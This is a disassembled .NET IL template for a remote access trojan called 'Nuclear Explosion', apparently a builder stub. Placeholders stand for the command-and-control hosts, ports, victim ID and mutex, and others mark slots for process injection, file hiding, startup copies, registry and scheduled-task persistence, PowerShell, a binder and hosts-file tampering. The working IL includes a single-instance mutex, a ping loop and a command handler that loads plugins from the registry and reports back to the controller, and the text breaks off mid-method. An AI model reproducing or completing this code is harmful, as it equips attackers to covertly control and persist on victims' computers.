
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.6.1055.0
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.module extern kernel32
.module extern user32
.module extern avicap32.dll
.module extern psapi
.module extern kernel32.dll
.module extern ntdll.dll
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Management
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly 'Nuclear Explosion'
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- The following custom attribute is added automatically, do not uncomment -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 07 01 00 00 00 00 ) 

  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module 'Nuclear Explosion.exe'
// MVID: {C2E36E15-F166-442B-BCA9-A296C2AB50F9}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x02BF0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi sealed VB$AnonymousDelegate_0
       extends [mscorlib]System.MulticastDelegate
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [mscorlib]System.Diagnostics.DebuggerDisplayAttribute::.ctor(string) = ( 01 00 12 3C 67 65 6E 65 72 61 74 65 64 20 6D 65   // ...<generated me
                                                                                                 74 68 6F 64 3E 01 00 54 0E 04 54 79 70 65 12 3C   // thod>..T..Type.<
                                                                                                 67 65 6E 65 72 61 74 65 64 20 6D 65 74 68 6F 64   // generated method
                                                                                                 3E )                                              // >
  .method public specialname rtspecialname 
          instance void  .ctor(object TargetObject,
                               native int TargetMethod) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::.ctor

  .method public newslot strict virtual instance class [mscorlib]System.IAsyncResult 
          BeginInvoke(class [mscorlib]System.AsyncCallback DelegateCallback,
                      object DelegateAsyncState) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::BeginInvoke

  .method public newslot strict virtual instance void 
          EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::EndInvoke

  .method public newslot strict virtual instance void 
          Invoke() runtime managed
  {
  } // end of method VB$AnonymousDelegate_0::Invoke

} // end of class VB$AnonymousDelegate_0

.class public auto ansi beforefieldinit Nuclear_Explosion.Atomic
       extends [mscorlib]System.Object
{
  .class auto ansi serializable sealed nested assembly _Closure$__
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public static initonly class Nuclear_Explosion.Atomic/_Closure$__ $I
    .field public static class VB$AnonymousDelegate_0 '$I24-0'
    .field public static class [mscorlib]System.EventHandler '$IR24-1'
    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method _Closure$__::.ctor

    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       11 (0xb)
      .maxstack  8
      IL_0000:  newobj     instance void Nuclear_Explosion.Atomic/_Closure$__::.ctor()
      IL_0005:  stsfld     class Nuclear_Explosion.Atomic/_Closure$__ Nuclear_Explosion.Atomic/_Closure$__::$I
      IL_000a:  ret
    } // end of method _Closure$__::.cctor

    .method assembly specialname instance void 
            '_Lambda$__R24-1'(object a0,
                              class [mscorlib]System.EventArgs a1) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       42 (0x2a)
      .maxstack  8
      IL_0000:  ldsfld     class VB$AnonymousDelegate_0 Nuclear_Explosion.Atomic/_Closure$__::'$I24-0'
      IL_0005:  brfalse.s  IL_000e

      IL_0007:  ldsfld     class VB$AnonymousDelegate_0 Nuclear_Explosion.Atomic/_Closure$__::'$I24-0'
      IL_000c:  br.s       IL_0024

      IL_000e:  ldsfld     class Nuclear_Explosion.Atomic/_Closure$__ Nuclear_Explosion.Atomic/_Closure$__::$I
      IL_0013:  ldftn      instance void Nuclear_Explosion.Atomic/_Closure$__::'_Lambda$__24-0'()
      IL_0019:  newobj     instance void VB$AnonymousDelegate_0::.ctor(object,
                                                                       native int)
      IL_001e:  dup
      IL_001f:  stsfld     class VB$AnonymousDelegate_0 Nuclear_Explosion.Atomic/_Closure$__::'$I24-0'
      IL_0024:  callvirt   instance void VB$AnonymousDelegate_0::Invoke()
      IL_0029:  ret
    } // end of method _Closure$__::'_Lambda$__R24-1'

    .method assembly specialname instance void 
            '_Lambda$__24-0'() cil managed
    {
      // Code size       14 (0xe)
      .maxstack  8
      IL_0000:  nop
      IL_0001:  nop
      IL_0002:  ldsfld     class [mscorlib]System.Threading.Mutex Nuclear_Explosion.Atomic::MT
      IL_0007:  callvirt   instance void [mscorlib]System.Threading.Mutex::ReleaseMutex()
      IL_000c:  nop
      IL_000d:  ret
    } // end of method _Closure$__::'_Lambda$__24-0'

  } // end of class _Closure$__

  .field public bool OW
  .field public object C
  .field public bool Cn
  .field public object SC
  .field public class [mscorlib]System.Threading.Thread PT
  .field public class [mscorlib]System.Threading.Thread INST
  .field public int32 I
  .field public int32 MS
  .field public string[] Hosts
  .field public string[] Ports
  .field public string ID
  .field public string MUTEX
  .field public int32 H
  .field public int32 P
  .field public static string SPL
  .field public static string App
  .field public static class Nuclear_Explosion.Atomic SCG
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo DI
  .field public static string Key
  .field public static class [mscorlib]System.Threading.Mutex MT
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       51 (0x33)
    .maxstack  8
    IL_0000:  ldstr      "*-]NK[-*"
    IL_0005:  stsfld     string Nuclear_Explosion.Atomic::SPL
    IL_000a:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_000f:  stsfld     string Nuclear_Explosion.Atomic::App
    IL_0014:  newobj     instance void Nuclear_Explosion.Atomic::.ctor()
    IL_0019:  stsfld     class Nuclear_Explosion.Atomic Nuclear_Explosion.Atomic::SCG
    IL_001e:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::.ctor()
    IL_0023:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo Nuclear_Explosion.Atomic::DI
    IL_0028:  ldstr      "%Socket Key%"
    IL_002d:  stsfld     string Nuclear_Explosion.Atomic::Key
    IL_0032:  ret
  } // end of method Atomic::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       195 (0xc3)
    .maxstack  5
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  ldc.i4.0
    IL_0009:  stfld      bool Nuclear_Explosion.Atomic::OW
    IL_000e:  ldarg.0
    IL_000f:  ldnull
    IL_0010:  stfld      object Nuclear_Explosion.Atomic::C
    IL_0015:  ldarg.0
    IL_0016:  ldc.i4.0
    IL_0017:  stfld      bool Nuclear_Explosion.Atomic::Cn
    IL_001c:  ldarg.0
    IL_001d:  ldarg.0
    IL_001e:  ldftn      instance void Nuclear_Explosion.Atomic::MAC()
    IL_0024:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0029:  ldc.i4.1
    IL_002a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_002f:  stfld      object Nuclear_Explosion.Atomic::SC
    IL_0034:  ldarg.0
    IL_0035:  ldarg.0
    IL_0036:  ldftn      instance void Nuclear_Explosion.Atomic::Pin()
    IL_003c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0041:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_0046:  stfld      class [mscorlib]System.Threading.Thread Nuclear_Explosion.Atomic::PT
    IL_004b:  ldarg.0
    IL_004c:  ldarg.0
    IL_004d:  ldftn      instance void Nuclear_Explosion.Atomic::INS()
    IL_0053:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0058:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
    IL_005d:  stfld      class [mscorlib]System.Threading.Thread Nuclear_Explosion.Atomic::INST
    IL_0062:  ldarg.0
    IL_0063:  ldc.i4.1
    IL_0064:  stfld      int32 Nuclear_Explosion.Atomic::I
    IL_0069:  ldarg.0
    IL_006a:  ldc.i4.0
    IL_006b:  stfld      int32 Nuclear_Explosion.Atomic::MS
    IL_0070:  ldarg.0
    IL_0071:  ldstr      "%H%"
    IL_0076:  ldstr      ","
    IL_007b:  ldc.i4.m1
    IL_007c:  ldc.i4.0
    IL_007d:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0082:  stfld      string[] Nuclear_Explosion.Atomic::Hosts
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "%P%"
    IL_008d:  ldstr      ","
    IL_0092:  ldc.i4.m1
    IL_0093:  ldc.i4.0
    IL_0094:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0099:  stfld      string[] Nuclear_Explosion.Atomic::Ports
    IL_009e:  ldarg.0
    IL_009f:  ldstr      "%ID%"
    IL_00a4:  stfld      string Nuclear_Explosion.Atomic::ID
    IL_00a9:  ldarg.0
    IL_00aa:  ldstr      "%MUT%"
    IL_00af:  stfld      string Nuclear_Explosion.Atomic::MUTEX
    IL_00b4:  ldarg.0
    IL_00b5:  ldc.i4.0
    IL_00b6:  stfld      int32 Nuclear_Explosion.Atomic::H
    IL_00bb:  ldarg.0
    IL_00bc:  ldc.i4.0
    IL_00bd:  stfld      int32 Nuclear_Explosion.Atomic::P
    IL_00c2:  ret
  } // end of method Atomic::.ctor

  .method public static void  Main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       322 (0x142)
    .maxstack  4
    .locals init (string V_0,
             bool V_1,
             bool V_2)
    IL_0000:  nop
%Sleep%
    IL_0031:  nop
%InjectCall%
    IL_0118:  nop
%HideFile%
    IL_0135:  nop
    IL_0136:  ldsfld     class Nuclear_Explosion.Atomic Nuclear_Explosion.Atomic::SCG
    IL_013b:  callvirt   instance void Nuclear_Explosion.Atomic::Execute()
    IL_0140:  nop
    IL_0141:  ret
  } // end of method Atomic::Main

  .method public instance void  Execute() cil managed
  {
    // Code size       54 (0x36)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      object Nuclear_Explosion.Atomic::SC
    IL_0007:  ldnull
    IL_0008:  ldstr      "Start"
    IL_000d:  ldc.i4.0
    IL_000e:  newarr     [mscorlib]System.Object
    IL_0013:  ldnull
    IL_0014:  ldnull
    IL_0015:  ldnull
    IL_0016:  ldc.i4.1
    IL_0017:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_001c:  pop
    IL_001d:  ldarg.0
    IL_001e:  ldfld      class [mscorlib]System.Threading.Thread Nuclear_Explosion.Atomic::PT
    IL_0023:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0028:  nop
    IL_0029:  ldarg.0
    IL_002a:  ldfld      class [mscorlib]System.Threading.Thread Nuclear_Explosion.Atomic::INST
    IL_002f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    IL_0034:  nop
    IL_0035:  ret
  } // end of method Atomic::Execute

  .method public instance void  INS() cil managed noinlining nooptimization
  {
    // Code size       1542 (0x606)
    .maxstack  8
    .locals init (string V_0,
             bool V_1,
             object V_2,
             object V_3,
             class [System]System.CodeDom.Compiler.CompilerResults V_4,
             string[] V_5,
             string[] V_6,
             int32 V_7,
             int32 V_8,
             bool V_9,
             string[] V_10,
             string[] V_11,
             int32 V_12,
             int32 V_13,
             class [mscorlib]System.Threading.Thread V_14,
             class [mscorlib]System.Threading.Thread V_15)
    IL_0000:  nop
%PC%
    IL_0026:  nop
%FKMSG%
    IL_005b:  nop
    .try
    {
      IL_005c:  nop
      IL_005d:  ldc.i4.1
      IL_005e:  ldarg.0
      IL_005f:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
      IL_0064:  ldarg.0
      IL_0065:  ldflda     bool Nuclear_Explosion.Atomic::OW
      IL_006a:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                                 string,
                                                                                 bool&)
      IL_006f:  stsfld     class [mscorlib]System.Threading.Mutex Nuclear_Explosion.Atomic::MT
      IL_0074:  ldarg.0
      IL_0075:  ldfld      bool Nuclear_Explosion.Atomic::OW
      IL_007a:  ldc.i4.0
      IL_007b:  ceq
      IL_007d:  stloc.1
      IL_007e:  ldloc.1
      IL_007f:  brfalse.s  IL_00b1

      IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0086:  nop
      IL_0087:  ldsfld     class [mscorlib]System.EventHandler Nuclear_Explosion.Atomic/_Closure$__::'$IR24-1'
      IL_008c:  brfalse.s  IL_0095

      IL_008e:  ldsfld     class [mscorlib]System.EventHandler Nuclear_Explosion.Atomic/_Closure$__::'$IR24-1'
      IL_0093:  br.s       IL_00ab

      IL_0095:  ldsfld     class Nuclear_Explosion.Atomic/_Closure$__ Nuclear_Explosion.Atomic/_Closure$__::$I
      IL_009a:  ldftn      instance void Nuclear_Explosion.Atomic/_Closure$__::'_Lambda$__R24-1'(object,
                                                                                                 class [mscorlib]System.EventArgs)
      IL_00a0:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                              native int)
      IL_00a5:  dup
      IL_00a6:  stsfld     class [mscorlib]System.EventHandler Nuclear_Explosion.Atomic/_Closure$__::'$IR24-1'
      IL_00ab:  call       void [System.Windows.Forms]System.Windows.Forms.Application::add_ApplicationExit(class [mscorlib]System.EventHandler)
      IL_00b0:  nop
      IL_00b1:  leave.s    IL_00c0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b8:  nop
      IL_00b9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00be:  leave.s    IL_00c0

    }  // end handler
    IL_00c0:  nop
    IL_00c1:  ldc.i4     0x88b8
    IL_00c6:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00cb:  nop
    IL_00cc:  ldsfld     string [mscorlib]System.String::Empty
    IL_00d1:  stloc.0
%CopyClient%
    IL_0116:  nop
%CopyStartup%
    IL_0152:  nop
%CopyStartupVBS%
    IL_01d4:  nop
%CopyStartupJS%
    IL_022d:  nop
%ShortcutLnk%
    IL_02ae:  nop
%ShortcutURL%
    IL_032f:  nop
%CodeDomStartup%
    IL_039c:  nop
%Registry%
    IL_03c3:  nop
%ShuldedTask%
    IL_03f1:  nop
%PowerShell%
    IL_0410:  nop
%Binder%
    IL_04ef:  nop
%HostsFile%
    IL_05ac:  nop
%ComplexThread%
    IL_05d8:  nop
%RegistryCall%
    IL_0604:  nop
    IL_0605:  ret
  } // end of method Atomic::INS

%ComplexMethod%

%RegistryMethod%

  .method public instance void  Pin() cil managed
  {
    // Code size       39 (0x27)
    .maxstack  3
    .locals init (bool V_0,
             int32& V_1)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  ldarg.0
    IL_0003:  ldfld      int32 Nuclear_Explosion.Atomic::I
    IL_0008:  ldc.i4.0
    IL_0009:  ceq
    IL_000b:  stloc.0
    IL_000c:  ldloc.0
    IL_000d:  brfalse.s  IL_001d

    IL_000f:  ldarg.0
    IL_0010:  ldflda     int32 Nuclear_Explosion.Atomic::MS
    IL_0015:  dup
    IL_0016:  stloc.1
    IL_0017:  ldloc.1
    IL_0018:  ldind.i4
    IL_0019:  ldc.i4.1
    IL_001a:  add.ovf
    IL_001b:  stind.i4
    IL_001c:  nop
    IL_001d:  nop
    IL_001e:  ldc.i4.1
    IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0024:  nop
    IL_0025:  br.s       IL_0001
  } // end of method Atomic::Pin

  .method public instance void  data(uint8[] b) cil managed
  {
    // Code size       1836 (0x72c)
    .maxstack  12
    .locals init (string[] V_0,
             bool V_1,
             bool V_2,
             bool V_3,
             bool V_4,
             bool V_5,
             bool V_6,
             string& V_7,
             string& V_8,
             string& V_9,
             string& V_10,
             string& V_11,
             string& V_12,
             string& V_13,
             string& V_14,
             string& V_15,
             string& V_16,
             string& V_17,
             object[] V_18,
             bool[] V_19,
             string& V_20,
             object[] V_21,
             bool[] V_22,
             object V_23)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.1
    IL_0003:  call       instance string Nuclear_Explosion.Atomic::BS(uint8[])
    IL_0008:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    IL_0015:  ldloc.0
    IL_0016:  ldc.i4.0
    IL_0017:  ldelem.ref
    IL_0018:  ldstr      "PNC"
    IL_001d:  ldc.i4.0
    IL_001e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0023:  ldc.i4.0
    IL_0024:  ceq
    IL_0026:  stloc.1
    IL_0027:  ldloc.1
    IL_0028:  brfalse.s  IL_0043

    IL_002a:  ldarg.0
    IL_002b:  ldc.i4.0
    IL_002c:  stfld      int32 Nuclear_Explosion.Atomic::I
    IL_0031:  ldarg.0
    IL_0032:  ldstr      "PNC"
    IL_0037:  call       instance void Nuclear_Explosion.Atomic::Send(string)
    IL_003c:  nop
    IL_003d:  nop
    IL_003e:  br         IL_072b

    IL_0043:  ldloc.0
    IL_0044:  ldc.i4.0
    IL_0045:  ldelem.ref
    IL_0046:  ldstr      "P"
    IL_004b:  ldc.i4.0
    IL_004c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0051:  ldc.i4.0
    IL_0052:  ceq
    IL_0054:  stloc.2
    IL_0055:  ldloc.2
    IL_0056:  brfalse.s  IL_00a9

    IL_0058:  ldarg.0
    IL_0059:  ldc.i4.1
    IL_005a:  stfld      int32 Nuclear_Explosion.Atomic::I
    IL_005f:  ldarg.0
    IL_0060:  ldstr      "P"
    IL_0065:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_006a:  ldarg.0
    IL_006b:  ldfld      int32 Nuclear_Explosion.Atomic::MS
    IL_0070:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
    IL_0075:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_007a:  call       instance void Nuclear_Explosion.Atomic::Send(string)
    IL_007f:  nop
    IL_0080:  ldarg.0
    IL_0081:  ldc.i4.0
    IL_0082:  stfld      int32 Nuclear_Explosion.Atomic::MS
    IL_0087:  ldarg.0
    IL_0088:  ldstr      "W"
    IL_008d:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_0092:  ldarg.0
    IL_0093:  call       instance string Nuclear_Explosion.Atomic::GAW()
    IL_0098:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_009d:  call       instance void Nuclear_Explosion.Atomic::Send(string)
    IL_00a2:  nop
    IL_00a3:  nop
    IL_00a4:  br         IL_072b

    IL_00a9:  ldloc.0
    IL_00aa:  ldc.i4.0
    IL_00ab:  ldelem.ref
    IL_00ac:  ldstr      "IE"
    IL_00b1:  ldc.i4.0
    IL_00b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_00b7:  ldc.i4.0
    IL_00b8:  ceq
    IL_00ba:  stloc.3
    IL_00bb:  ldloc.3
    IL_00bc:  brfalse    IL_0256

    IL_00c1:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
    IL_00c6:  ldstr      "Software\\"
    IL_00cb:  ldarg.0
    IL_00cc:  ldarg.0
    IL_00cd:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
    IL_00d2:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
    IL_00d7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_00dc:  ldstr      "\\"
    IL_00e1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_00e6:  ldloc.0
    IL_00e7:  ldc.i4.1
    IL_00e8:  ldelem.ref
    IL_00e9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_00ee:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_00f3:  ldc.i4.1
    IL_00f4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                bool)
    IL_00f9:  ldnull
    IL_00fa:  cgt.un
    IL_00fc:  stloc.s    V_4
    IL_00fe:  ldloc.s    V_4
    IL_0100:  brfalse    IL_0207

    .try
    {
      IL_0105:  nop
      IL_0106:  ldarg.0
      IL_0107:  ldarg.0
      IL_0108:  ldfld      string[] Nuclear_Explosion.Atomic::Hosts
      IL_010d:  ldarg.0
      IL_010e:  ldfld      int32 Nuclear_Explosion.Atomic::H
      IL_0113:  ldelem.ref
      IL_0114:  ldarg.0
      IL_0115:  ldfld      string[] Nuclear_Explosion.Atomic::Ports
      IL_011a:  ldarg.0
      IL_011b:  ldfld      int32 Nuclear_Explosion.Atomic::P
      IL_0120:  ldelem.ref
      IL_0121:  ldloc.0
      IL_0122:  ldc.i4.4
      IL_0123:  ldelem.ref
      IL_0124:  ldloc.0
      IL_0125:  ldc.i4.5
      IL_0126:  ldelem.ref
      IL_0127:  ldarg.0
      IL_0128:  ldarg.0
      IL_0129:  ldarg.0
      IL_012a:  ldfld      string Nuclear_Explosion.Atomic::ID
      IL_012f:  call       instance object Nuclear_Explosion.Atomic::Decode(string)
      IL_0134:  ldstr      "_"
      IL_0139:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_013e:  ldarg.0
      IL_013f:  call       instance string Nuclear_Explosion.Atomic::HWD()
      IL_0144:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0149:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_014e:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_0153:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0158:  ldstr      "HKEY_CURRENT_USER\\SOFTWARE\\"
      IL_015d:  ldarg.0
      IL_015e:  ldarg.0
      IL_015f:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
      IL_0164:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_0169:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_016e:  ldstr      "\\"
      IL_0173:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0178:  ldloc.0
      IL_0179:  ldc.i4.1
      IL_017a:  ldelem.ref
      IL_017b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0180:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0185:  ldloc.0
      IL_0186:  ldc.i4.1
      IL_0187:  ldelem.ref
      IL_0188:  ldnull
      IL_0189:  call       object [mscorlib]Microsoft.Win32.Registry::GetValue(string,
                                                                               string,
                                                                               object)
      IL_018e:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0193:  ldloc.0
      IL_0194:  ldc.i4.2
      IL_0195:  ldelem.ref
      IL_0196:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_019b:  ldloc.0
      IL_019c:  ldc.i4.3
      IL_019d:  ldelem.ref
      IL_019e:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
      IL_01a3:  ldloc.0
      IL_01a4:  ldc.i4.1
      IL_01a5:  ldelem.ref
      IL_01a6:  ldc.i4.1
      IL_01a7:  call       instance object Nuclear_Explosion.Atomic::INV(string,
                                                                         string,
                                                                         string,
                                                                         string,
                                                                         string,
                                                                         string,
                                                                         int32,
                                                                         bool,
                                                                         string,
                                                                         bool)
      IL_01ac:  pop
      IL_01ad:  leave.s    IL_0203

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  nop
      IL_01b5:  ldarg.0
      IL_01b6:  ldc.i4.7
      IL_01b7:  newarr     [mscorlib]System.String
      IL_01bc:  dup
      IL_01bd:  ldc.i4.0
      IL_01be:  ldstr      "GPL"
      IL_01c3:  stelem.ref
      IL_01c4:  dup
      IL_01c5:  ldc.i4.1
      IL_01c6:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_01cb:  stelem.ref
      IL_01cc:  dup
      IL_01cd:  ldc.i4.2
      IL_01ce:  ldloc.0
      IL_01cf:  ldc.i4.5
      IL_01d0:  ldelem.ref
      IL_01d1:  stelem.ref
      IL_01d2:  dup
      IL_01d3:  ldc.i4.3
      IL_01d4:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_01d9:  stelem.ref
      IL_01da:  dup
      IL_01db:  ldc.i4.4
      IL_01dc:  ldloc.0
      IL_01dd:  ldc.i4.1
      IL_01de:  ldelem.ref
      IL_01df:  stelem.ref
      IL_01e0:  dup
      IL_01e1:  ldc.i4.5
      IL_01e2:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_01e7:  stelem.ref
      IL_01e8:  dup
      IL_01e9:  ldc.i4.6
      IL_01ea:  ldc.i4.0
      IL_01eb:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
      IL_01f0:  stelem.ref
      IL_01f1:  call       string [mscorlib]System.String::Concat(string[])
      IL_01f6:  call       instance void Nuclear_Explosion.Atomic::Send(string)
      IL_01fb:  nop
      IL_01fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0201:  leave.s    IL_0203

    }  // end handler
    IL_0203:  nop
    IL_0204:  nop
    IL_0205:  br.s       IL_0250

    IL_0207:  nop
    IL_0208:  ldarg.0
    IL_0209:  ldc.i4.7
